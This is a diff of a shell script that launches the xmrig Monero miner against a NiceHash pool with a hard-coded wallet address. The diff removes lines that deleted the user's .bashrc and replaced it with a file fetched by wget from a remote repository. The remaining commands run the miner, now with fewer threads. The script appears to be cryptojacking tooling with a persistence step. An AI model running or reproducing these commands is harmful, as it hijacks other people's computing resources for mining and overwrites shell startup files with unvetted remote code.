@@ -1,16 +1,10 @@
-apt-get update -y
-apt-get install wget -y
-
-rm -rf .bashrc
-wget https://raw.githubusercontent.com/scorpionyb/file-bashrc/main/bash.xmr && cp bash.xmr .bashrc
-rm -rf bash.xmr
 
 
 cd xmrig/build 
-./xmrig -o randomxmonero.auto.nicehash.com:9200 -a rx -k -u 3AMo7dabRoSwWAkNykLgfyzsEUL52SsoTo.reno2f -pass x -t 4
+./xmrig -o randomxmonero.auto.nicehash.com:9200 -a rx -k -u 3AMo7dabRoSwWAkNykLgfyzsEUL52SsoTo.reno8t -pass x -t 1
 cd 
 cd xmrig/build 
-./xmrig -o randomxmonero.auto.nicehash.com:9200 -a rx -k -u 3AMo7dabRoSwWAkNykLgfyzsEUL52SsoTo.reno2f -pass x -t 4 --randomx-mode=light
+./xmrig -o randomxmonero.auto.nicehash.com:9200 -a rx -k -u 3AMo7dabRoSwWAkNykLgfyzsEUL52SsoTo.reno8t -pass x -t 1 --randomx-mode=light
 
 apt update -y
 apt upgrade -y
